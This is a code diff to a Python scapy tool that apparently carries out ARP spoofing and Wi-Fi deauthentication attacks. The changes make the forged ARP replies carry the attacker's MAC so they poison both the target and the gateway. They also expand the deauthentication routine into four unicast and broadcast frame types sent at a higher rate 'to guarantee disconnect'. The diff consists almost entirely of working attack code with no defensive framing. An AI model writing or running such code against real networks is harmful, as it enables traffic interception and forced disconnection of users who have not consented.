@@ -77,6 +77,7 @@ set_console_title(os.environ.get("ARP_SPOOFER_WINDOW_TITLE", title))
 CHECK_INTERVAL = 30
 TARGET_REFRESH_INTERVAL = 60
 TARGET_MAC_REFRESH_INTERVAL = 75
+SPOOF_INTERVAL = 2
 INTERNET_CHECK_TIMEOUT = 5
 INTERNET_CACHE_TTL = 15
 RECOVERY_COOLDOWN = 120
@@ -1720,6 +1721,10 @@ class SpoofSession:
         self.sock = None
         self._packet_cache = []
         self._cache_dirty = True
+        try:
+            self.local_mac = scapy.get_if_hwaddr(conf.iface)
+        except Exception:
+            self.local_mac = "00:00:00:00:00:00"
 
     def _is_excluded_ip(self, ip: str, local_ip: str) -> bool:
         if not ip or ip == self.gateway or ip == local_ip:
@@ -1835,10 +1840,10 @@ class SpoofSession:
                 continue
                 
             self._packet_cache.append(
-                scapy.Ether(dst=t["mac"]) / scapy.ARP(op=2, pdst=t["ip"], hwdst=t["mac"], psrc=self.gateway)
+                scapy.Ether(src=self.local_mac, dst=t["mac"]) / scapy.ARP(op=2, hwsrc=self.local_mac, pdst=t["ip"], hwdst=t["mac"], psrc=self.gateway)
             )
             self._packet_cache.append(
-                scapy.Ether(dst=self.gateway_mac) / scapy.ARP(op=2, pdst=self.gateway, hwdst=self.gateway_mac, psrc=t["ip"])
+                scapy.Ether(src=self.local_mac, dst=self.gateway_mac) / scapy.ARP(op=2, hwsrc=self.local_mac, pdst=self.gateway, hwdst=self.gateway_mac, psrc=t["ip"])
             )
             
         self._cache_dirty = False
@@ -1861,7 +1866,7 @@ class SpoofSession:
             except Exception:
                 pass
             try:
-                self.sock = scapy.L2socket(iface=conf.iface)
+                self.sock = conf.L2socket(iface=conf.iface)
             except Exception:
                 self.sock = None
 
@@ -1876,14 +1881,22 @@ class SpoofSession:
             return
             
         log_info(f"Deauth attack active on {target_ip} ({target_mac}) via {self.gateway_mac}")
-        pkt = scapy.RadioTap() / scapy.Dot11(type=0, subtype=12, addr1=target_mac, addr2=self.gateway_mac, addr3=self.gateway_mac) / scapy.Dot11Deauth(reason=7)
+        
+        # 4-way deauth frame to guarantee disconnect
+        deauth_pkts = [
+            scapy.RadioTap() / scapy.Dot11(type=0, subtype=12, addr1=target_mac, addr2=self.gateway_mac, addr3=self.gateway_mac) / scapy.Dot11Deauth(reason=7),
+            scapy.RadioTap() / scapy.Dot11(type=0, subtype=12, addr1=self.gateway_mac, addr2=target_mac, addr3=target_mac) / scapy.Dot11Deauth(reason=7),
+            scapy.RadioTap() / scapy.Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2=self.gateway_mac, addr3=self.gateway_mac) / scapy.Dot11Deauth(reason=7),
+            scapy.RadioTap() / scapy.Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2=target_mac, addr3=target_mac) / scapy.Dot11Deauth(reason=7)
+        ]
         
         while not self._stop.is_set():
-            try:
-                scapy.sendp(pkt, count=20, inter=0.02, verbose=False)
-            except Exception:
-                pass
-            self._stop.wait(1)
+            for pkt in deauth_pkts:
+                try:
+                    scapy.sendp(pkt, count=15, inter=0.01, verbose=False)
+                except Exception:
+                    pass
+            self._stop.wait(0.5)
 
     def watchdog_loop(self):
         while not self._stop.is_set():
@@ -1940,7 +1953,7 @@ class SpoofSession:
                 sys.exit(1)
 
         try:
-            self.sock = scapy.L2socket(iface=conf.iface)
+            self.sock = conf.L2socket(iface=conf.iface)
             log_ok(f"L2 raw socket opened on {conf.iface}")
         except Exception as exc:
             log_err(f"Failed to open L2 socket: {exc}. Falling back to standard sendp.")
